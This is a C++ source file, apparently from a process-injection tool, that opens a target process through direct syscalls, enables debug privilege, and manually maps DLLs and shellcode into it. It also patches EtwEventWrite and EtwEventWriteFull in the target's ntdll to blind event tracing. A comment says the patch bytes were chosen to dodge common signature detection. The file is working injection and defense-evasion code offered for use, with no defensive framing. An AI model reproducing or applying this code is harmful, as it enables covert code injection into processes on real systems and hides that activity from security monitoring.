#include "mm_executor.h"
#include "syscalls.h"
#include "win_offsets.h"
#include "peb_walk.h"
#include "manual_map.h"
#include "loader_stub.h"

#include <algorithm>
#include <cstring>
#include <string>
#include <vector>

namespace {

// ── Error formatting ───────────────────────────────────────────────────────────

void write_error_text(const std::wstring& msg, wchar_t* buf, uint32_t cap, uint32_t* written) {
    if (written) *written = 0;
    if (!buf || cap == 0) return;
    const auto n = static_cast<uint32_t>((std::min)(msg.size(), static_cast<size_t>(cap - 1)));
    if (n > 0) memcpy(buf, msg.data(), n * sizeof(wchar_t));
    buf[n] = L'\0';
    if (written) *written = n;
}

void write_error(const std::wstring& msg, uint16_t* buf, uint32_t cap, uint32_t* written) {
    write_error_text(msg, reinterpret_cast<wchar_t*>(buf), cap, written);
}

std::wstring to_wstring(const mm_u16_view& view) {
    if (!view.ptr || view.len == 0) return {};
    return std::wstring(reinterpret_cast<const wchar_t*>(view.ptr), view.len);
}

std::wstring format_system_error(DWORD err) {
    LPWSTR raw = nullptr;
    const DWORD sz = FormatMessageW(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        nullptr, err, 0, reinterpret_cast<LPWSTR>(&raw), 0, nullptr);
    std::wstring msg;
    if (sz > 0 && raw) { msg.assign(raw, sz); LocalFree(raw); }
    return msg;
}

size_t align_up(size_t v, size_t a) {
    const size_t r = v % a;
    return r == 0 ? v : v + (a - r);
}

// ── Privilege ──────────────────────────────────────────────────────────────────

void enable_debug_privilege() {
    HANDLE token = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
        return;
    TOKEN_PRIVILEGES tp{};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (LookupPrivilegeValueW(nullptr, SE_DEBUG_NAME, &tp.Privileges[0].Luid))
        AdjustTokenPrivileges(token, FALSE, &tp, 0, nullptr, nullptr);
    CloseHandle(token);
}

// ── Target identity validation ─────────────────────────────────────────────────

uint64_t get_process_create_time(HANDLE process) {
    FILETIME ct{}, et{}, kt{}, ut{};
    if (!GetProcessTimes(process, &ct, &et, &kt, &ut)) return 0;
    ULARGE_INTEGER v{};
    v.LowPart = ct.dwLowDateTime;
    v.HighPart = ct.dwHighDateTime;
    return v.QuadPart;
}

std::wstring get_process_image_path(HANDLE process) {
    std::wstring buf(512, L'\0');
    DWORD len = static_cast<DWORD>(buf.size());
    while (!QueryFullProcessImageNameW(process, 0, buf.data(), &len)) {
        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) return {};
        buf.resize(buf.size() * 2);
        len = static_cast<DWORD>(buf.size());
    }
    buf.resize(len);
    return buf;
}

mm_status validate_target_identity(HANDLE process, const mm_execute_request* req, std::wstring& error) {
    if (req->process_create_time_utc_100ns != 0) {
        const auto actual = get_process_create_time(process);
        if (actual != req->process_create_time_utc_100ns) {
            error = L"Target process identity changed.";
            return MM_TARGET_CHANGED;
        }
    }
    const auto expected = to_wstring(req->exe_path);
    if (!expected.empty()) {
        const auto actual = get_process_image_path(process);
        if (actual.empty() || _wcsicmp(actual.c_str(), expected.c_str()) != 0) {
            error = L"Target executable path changed.";
            return MM_TARGET_CHANGED;
        }
    }
    return MM_OK;
}

// ── Options validation ─────────────────────────────────────────────────────────

bool validate_options(const mm_execute_request* req, std::wstring& error) {
    for (uint32_t i = 0; i < req->option_count; ++i) {
        if (to_wstring(req->options[i].name).empty()) {
            error = L"Executor option name cannot be empty.";
            return false;
        }
    }
    return true;
}

// ── Environment apply via shellcode ────────────────────────────────────────────

mm_status apply_environment_remote(
    HANDLE process,
    const mm_execute_request* request,
    uint32_t timeout_ms,
    const std::vector<RemoteModuleInfo>& remote_modules,
    std::wstring& error)
{
    if (request->env_count == 0) return MM_OK;

    // 1. Resolve SetEnvironmentVariableW from remote kernel32.
    uintptr_t fn_set_env = 0;
    for (const auto& mod : remote_modules) {
        if (_wcsicmp(mod.name.c_str(), L"kernel32.dll") == 0) {
            auto st = resolve_remote_export(process, mod.base, "SetEnvironmentVariableW",
                                             fn_set_env, remote_modules, error);
            if (st != MM_OK) return st;
            break;
        }
    }
    if (!fn_set_env) {
        error = L"Failed to resolve SetEnvironmentVariableW.";
        return MM_EXECUTION_FAILED;
    }

    // 2. Compute total size for string data.
    struct StringAlloc { PVOID remote; SIZE_T size; };
    std::vector<StringAlloc> string_allocs;
    std::vector<uint64_t> name_ptrs;
    std::vector<uint64_t> value_ptrs;

    for (uint32_t i = 0; i < request->env_count; ++i) {
        const auto name  = to_wstring(request->env[i].name);
        const auto value = to_wstring(request->env[i].value);
        if (name.empty()) {
            error = L"Environment variable name cannot be empty.";
            return MM_INVALID_ARGUMENT;
        }

        // Allocate and write name string.
        SIZE_T name_bytes = (name.size() + 1) * sizeof(wchar_t);
        SIZE_T name_alloc = align_up(name_bytes, 0x1000);
        PVOID remote_name = nullptr;
        auto st = syscall::NtAllocateVirtualMemory(process, &remote_name, 0, &name_alloc,
                                                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!NT_SUCCESS(st)) { error = L"Failed to allocate env name."; return MM_EXECUTION_FAILED; }
        syscall::NtWriteVirtualMemory(process, remote_name, name.c_str(), name_bytes, nullptr);
        string_allocs.push_back({remote_name, name_alloc});
        name_ptrs.push_back(reinterpret_cast<uint64_t>(remote_name));

        // Allocate and write value string.
        SIZE_T val_bytes = (value.size() + 1) * sizeof(wchar_t);
        SIZE_T val_alloc = align_up(val_bytes, 0x1000);
        PVOID remote_val = nullptr;
        st = syscall::NtAllocateVirtualMemory(process, &remote_val, 0, &val_alloc,
                                               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!NT_SUCCESS(st)) { error = L"Failed to allocate env value."; return MM_EXECUTION_FAILED; }
        syscall::NtWriteVirtualMemory(process, remote_val, value.c_str(), val_bytes, nullptr);
        string_allocs.push_back({remote_val, val_alloc});
        value_ptrs.push_back(reinterpret_cast<uint64_t>(remote_val));
    }

    // 3. Build context.
    const size_t ctx_size = sizeof(EnvApplyContext) + request->env_count * sizeof(EnvEntry);
    std::vector<uint8_t> ctx_buf(ctx_size, 0);
    auto* ctx = reinterpret_cast<EnvApplyContext*>(ctx_buf.data());
    ctx->fn_set_env_variable_w = fn_set_env;
    ctx->env_count = request->env_count;

    auto* entries = reinterpret_cast<EnvEntry*>(ctx + 1);
    for (uint32_t i = 0; i < request->env_count; ++i) {
        entries[i].name_ptr  = name_ptrs[i];
        entries[i].value_ptr = value_ptrs[i];
    }

    // 4. Get env_apply_stub code.
    const auto stub = get_stub_info(reinterpret_cast<void*>(&env_apply_stub));
    if (!stub.code || stub.size == 0) {
        error = L"Failed to locate env_apply_stub code.";
        // Cleanup string allocs will happen below.
    }

    mm_status result = MM_OK;
    if (stub.code && stub.size > 0) {
        result = execute_remote_stub(process, stub.code, stub.size,
                                      ctx_buf.data(), ctx_buf.size(), timeout_ms, error);
    } else {
        result = MM_EXECUTION_FAILED;
    }

    // 5. Cleanup: zero and free all string allocations.
    for (auto& sa : string_allocs) {
        std::vector<uint8_t> zeros(sa.size, 0);
        syscall::NtWriteVirtualMemory(process, sa.remote, zeros.data(), sa.size, nullptr);
        SIZE_T free_sz = 0;
        syscall::NtFreeVirtualMemory(process, &sa.remote, &free_sz, MEM_RELEASE);
    }

    SecureZeroMemory(ctx_buf.data(), ctx_buf.size());
    return result;
}

// ── Main execution flow ────────────────────────────────────────────────────────

mm_status execute_remote(const mm_execute_request* request, std::wstring& error) {
    // 0. Initialize the syscall layer (once).
    {
        static bool initialized = false;
        static bool init_ok = false;
        static std::wstring init_error;
        if (!initialized) {
            init_ok = syscall_init(init_error);
            initialized = true;
        }
        if (!init_ok) {
            error = L"Syscall init failed: " + init_error;
            return MM_EXECUTION_FAILED;
        }
    }

    enable_debug_privilege();

    // 1. Open target process via syscall.
    HANDLE raw_handle = nullptr;
    {
        NT_OBJECT_ATTRIBUTES oa{};
        oa.Length = sizeof(oa);
        NT_CLIENT_ID cid{};
        cid.UniqueProcess = reinterpret_cast<HANDLE>(static_cast<uintptr_t>(request->pid));
        auto st = syscall::NtOpenProcess(
            &raw_handle,
            PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
            PROCESS_QUERY_LIMITED_INFORMATION |
            PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
            &oa, &cid);
        if (!NT_SUCCESS(st) || !raw_handle) {
            error = L"NtOpenProcess failed (pid " + std::to_wstring(request->pid) + L").";
            return MM_TARGET_NOT_FOUND;
        }
    }
    ScopedNtHandle process(raw_handle);

    // 2. Validate target identity.
    auto status = validate_target_identity(process.get(), request, error);
    if (status != MM_OK) return status;

    // 3. Enumerate remote modules (PEB walk) — used for import resolution + env apply.
    std::vector<RemoteModuleInfo> remote_modules;
    status = enumerate_remote_modules(process.get(), remote_modules, error);
    if (status != MM_OK) return status;

    // 4. Blind user-mode ETW in target process.
    //    Patches EtwEventWrite with "xor eax,eax; ret" (returns STATUS_SUCCESS)
    //    instead of a bare 0xC3, which is the most commonly signature-matched patch.
    //    Only when "etw-blind" option is set. Skipped for self-injection.
    {
        bool etw_blind_requested = false;
        for (uint32_t i = 0; i < request->option_count; ++i) {
            if (to_wstring(request->options[i].name) == L"etw-blind")
                etw_blind_requested = true;
        }

        NT_PROCESS_BASIC_INFORMATION etw_pbi{};
        syscall::NtQueryInformationProcess(process.get(), 0, &etw_pbi, sizeof(etw_pbi), nullptr);
        bool is_self = (static_cast<uint32_t>(etw_pbi.UniqueProcessId) == GetCurrentProcessId());

        if (etw_blind_requested && !is_self) {
            // Patch both EtwEventWrite and EtwEventWriteFull for complete coverage.
            const char* etw_exports[] = { "EtwEventWrite", "EtwEventWriteFull" };
            for (const auto& mod : remote_modules) {
                if (_wcsicmp(mod.name.c_str(), L"ntdll.dll") != 0) continue;
                for (const auto* export_name : etw_exports) {
                    uintptr_t etw_addr = 0;
                    std::wstring etw_err;
                    if (resolve_remote_export(process.get(), mod.base, export_name,
                                               etw_addr, remote_modules, etw_err) != MM_OK || !etw_addr)
                        continue;
                    PVOID patch_addr = reinterpret_cast<PVOID>(etw_addr);
                    SIZE_T patch_region = 0x1000;
                    ULONG old_prot = 0;
                    auto pst = syscall::NtProtectVirtualMemory(process.get(), &patch_addr, &patch_region,
                                                                PAGE_EXECUTE_READWRITE, &old_prot);
                    if (NT_SUCCESS(pst)) {
                        // xor eax, eax; ret → returns 0 (STATUS_SUCCESS).
                        const uint8_t patch[] = { 0x33, 0xC0, 0xC3 };
                        syscall::NtWriteVirtualMemory(process.get(),
                            reinterpret_cast<PVOID>(etw_addr), patch, sizeof(patch), nullptr);
                        patch_addr = reinterpret_cast<PVOID>(etw_addr);
                        patch_region = 0x1000;
                        syscall::NtProtectVirtualMemory(process.get(), &patch_addr, &patch_region,
                                                         old_prot, &old_prot);
                    }
                }
                break;
            }
        }
    }

    // 5. Apply environment variables via shellcode.
    if (request->env_count > 0) {
        status = apply_environment_remote(process.get(), request, request->timeout_ms,
                                           remote_modules, error);
        if (status != MM_OK) return status;
    }

    // 6. Manual-map each module in order.
    std::vector<MappedModule> mapped_modules;
    for (uint32_t i = 0; i < request->module_count; ++i) {
        const auto module_path = to_wstring(request->modules[i]);
        if (module_path.empty()) {
            status = MM_INVALID_ARGUMENT;
            error = L"Module path cannot be empty.";
            break;
        }

        status = manual_map_remote(process.get(), request->pid, module_path, request->timeout_ms,
                                    remote_modules, mapped_modules, error);
        if (status != MM_OK) break;
    }

    return status;
}

}  // namespace

// ── Public ABI (unchanged) ─────────────────────────────────────────────────────

extern "C" mm_status MM_CALL mm_execute(
    const mm_execute_request* request,
    uint16_t* error_buffer,
    uint32_t error_buffer_capacity,
    uint32_t* error_buffer_written)
{
    if (!request) {
        write_error(L"Request cannot be null.", error_buffer, error_buffer_capacity, error_buffer_written);
        return MM_INVALID_ARGUMENT;
    }
    if (request->pid == 0 || !request->modules || request->module_count == 0) {
        write_error(L"Request must include a pid and at least one module.",
                    error_buffer, error_buffer_capacity, error_buffer_written);
        return MM_INVALID_ARGUMENT;
    }
    if (request->env_count > 0 && !request->env) {
        write_error(L"Request environment pointer cannot be null when env_count is nonzero.",
                    error_buffer, error_buffer_capacity, error_buffer_written);
        return MM_INVALID_ARGUMENT;
    }
    if (request->option_count > 0 && !request->options) {
        write_error(L"Request options pointer cannot be null when option_count is nonzero.",
                    error_buffer, error_buffer_capacity, error_buffer_written);
        return MM_INVALID_ARGUMENT;
    }

    std::wstring error;
    if (!validate_options(request, error)) {
        write_error(error, error_buffer, error_buffer_capacity, error_buffer_written);
        return MM_INVALID_ARGUMENT;
    }

    const auto status = execute_remote(request, error);
    write_error(error, error_buffer, error_buffer_capacity, error_buffer_written);
    return status;
}

extern "C" int32_t MM_CALL mm_validate_offsets(
    uint16_t* error_buffer,
    uint32_t error_buffer_capacity,
    uint32_t* error_buffer_written)
{
    // Force initialization if not already done.
    if (!win_offsets().initialized) {
        std::wstring init_error;
        if (!syscall_init(init_error)) {
            write_error(init_error, error_buffer, error_buffer_capacity, error_buffer_written);
            return -1;
        }
    }

    const auto& off = win_offsets();
    int32_t result = 0;
    if (!off.ssn_pattern_validated)    result |= 1;
    if (!off.api_set_available)        result |= 2;
    if (off.btt_call_addr == nullptr)  result |= 4;
    if (off.ruts_call_addr == nullptr) result |= 8;
    if (off.spi_unique_process_id == 0) result |= 16;

    if (result != 0) {
        std::wstring detail = L"Offset validation failures: ";
        if (result & 1)  detail += L"SSN ";
        if (result & 2)  detail += L"ApiSet ";
        if (result & 4)  detail += L"BTT ";
        if (result & 8)  detail += L"RUTS ";
        if (result & 16) detail += L"SPI ";
        write_error(detail, error_buffer, error_buffer_capacity, error_buffer_written);
    }

    return result;
}
